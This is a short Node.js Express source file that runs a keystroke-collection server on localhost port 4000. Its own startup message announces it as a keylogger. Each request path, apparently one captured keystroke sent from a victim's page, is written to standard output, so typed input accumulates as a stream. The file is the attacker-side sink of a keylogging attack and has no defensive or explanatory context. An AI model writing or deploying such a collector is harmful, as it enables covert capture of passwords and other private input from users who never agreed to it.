const express = require("express");
const app = express();

app.get("/:key", (req, res) => {
  process.stdout.write(req.params.key);
  return res.sendStatus(400);
});

app.listen(4000, () => console.log("> Ready to keylog at localhost:4000"));
